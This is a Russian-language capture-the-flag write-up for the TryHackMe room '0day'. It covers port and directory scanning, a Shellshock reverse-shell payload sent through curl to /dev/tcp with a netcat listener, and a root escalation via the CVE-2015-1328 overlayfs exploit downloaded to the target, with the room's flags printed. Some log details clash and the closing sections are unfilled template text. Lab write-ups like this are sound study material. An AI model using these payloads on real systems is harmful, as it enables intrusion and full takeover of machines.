# 0day

**Сложность:** Medium

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/6846478e-305b-4288-be7a-61f717ef11a8" />


| | |
|---|---|
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/0day |
| **ОС** | Linux |
| **Теги** | `web`, `linux`, `shellshock`, `privesc`, `exploitation` |

## Кратко

Машина c открытыми 22 и 80 портом, на сервере в папке /cgi-bin лежит файл test.cgi - это shellshock, через него попадаем на машину под пользователем www-data. Узнаем версию Ubuntu 14.04.1 LTS, под которую выпущен эксплойт `'overlayfs' Local Privilege Escalation`, через который мы повышаем привилегии до root.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV -p-65535 10.82.184.147
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-09 14:19 -0400
Nmap scan report for 10.82.184.147
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds
```

Обнаружил два открытых порта: 80, на котором стоит веб Apache httpd 2.4.7 ((Ubuntu)) и 22, ssh. Версии сервисов указывают,
что операционная система сервера скорее всего Ubuntu. 
### Перечисление сервисов

На 80 порту лежит обычная веб страничка. Пробую фаззить ее с помощью ffuf.
```bash
ffuf -u http://10.82.184.147/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

```
.htaccess.php           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 53ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd.php           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 52ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 52ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 68ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 68ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 56ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 50ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 52ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 57ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 59ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 59ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 50ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 50ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 52ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 52ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 59ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 59ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 79ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 80ms]
:: Progress: [61407/61407] :: Job [1/1] :: 727 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
```
Наблюдаю пару интересных директорий: admin, backup, secret, uploads, cgi-bin. Разберу их по одной:

/admin - выдает просто белый экран, дальше;

/backup - файл с приватным ключом, зашифрованный паролем (я его расшифровал, но применить по ходу эксплуатации так и не довелось, хотя расшифровал, пробовал применить к 
существующим учетным записям);

/secret - фотография черепашки, ничего интересного, дальше;

/uploads - так же как и admin выдает белый экран, дальше;

/cgi-bin - интересная директория, обычно в ней лежат скрипты, такие как: .py, .sh, .cgi, pl. Напрямую доступ к ней запрещен, рассказал про нее в следующем пункте.

## 2. Получение доступа
Попробовав перебор файлов в /cgi-bin с помощью специально созданных для этой директории словарей, я нашел файл test.cgi, при открытии которого на страничке
Высвечивается надпись Hello World!. Это прямой указатель на уязвимость shellshock. 
Захожу на Payloads All The Things, ввожу в поиске shellshock и копирую пэйлоад `curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" `. Нужно его адаптировать под себя и применить:

Открываю еще одно окно терминала, ввожу `nc -lnvp 4444` для прослушки входящих подключений по 4444 порту;

В другом ввожу адаптированный под себя эксплойт `curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.132.101/4444 0>&1" "https://10.82.184.147/cgi-bin/test.cgi"`;

В окне прослушивания открывается reverse shell. Для начала необходимо узнать, где я вообще оказался, и какая версия операционной системы здесь

```
www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/usr/lib/cgi-bin$ uname -r
uname -r
3.13.0-32-generic
www-data@ubuntu:/usr/lib/cgi-bin$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
www-data@ubuntu:/usr/lib/cgi-bin$ 
```

Версия целевой машины - "Ubuntu 14.04.1 LTS". Оставляю это на потом, после первичного доступа пробую искать флаг пользователя
```
www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$ cd ryan
cd ryan
www-data@ubuntu:/home/ryan$ ls
ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}
```

**Флаг пользователя:** `THM{Sh3llSh0ck_r0ckz}`

## 3. Повышение привилегий

Ранее я говорил, что версия целевой операционной системы - "Ubuntu 14.04.1 LTS". Поискав уязвимости под эту версию ОС, узнал, что в ней есть CVE-2015-1328, 
Под которую есть эксплойт 'overlayfs' Local Privilege Escalation. Скачиваю код экплойта с exploit-db.com на kali. Как позже выяснилось, компилятора на целевой машине не было, поэтому пришлось компилировать на своей. Архитектуры машин совпадали, я скомпилировал код на Kali Linux статически, используя `gcc -static 37292.c -o exploit`. Запускаю питон-сервер, чтобы с него
можно было скачать эксплойт через wget: `python3 -m http-server 8080`. Перехожу в консоль Реверс-шелла для скачивания файла эксплойта.

```
www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp

www-data@ubuntu:/tmp$ wget http://192.168.132.101:8080/exploit
wget http://192.168.132.101:8080/exploit
--2026-10-9 14:23:11--  http://192.168.132.101:8080
Connecting to 192.168.131.101:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18432 (18K) [application/octet-stream]
Saving to: 'ofs_exploit'

exploit         100%[===================>]  18.00K  --.-KB/s    in 0.05s   

2026-10-9 14:23:11 (360 KB/s) - 'exploit' saved [18432/18432]

www-data@ubuntu:/tmp$ chmod +x exploit
chmod +x exploit

www-data@ubuntu:/tmp$ ./exploit
spawning shells
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

root@ubuntu:/tmp# whoami
whoami
root

root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt

root@ubuntu:/root# cat root.txt
cat root.txt
THM{g00d_j0b_0day_is_Pleased}

```

**Флаг root:** `THM{g00d_j0b_0day_is_Pleased}`

## Выводы

- Уязвимости, который были использованы: `shellshock`,  `CVE-2015-1328`
- Как их можно было предотвратить
- Что стоит запомнить/чему научился

## Использованные инструменты

`nmap`, `gobuster`, `hydra`, ...
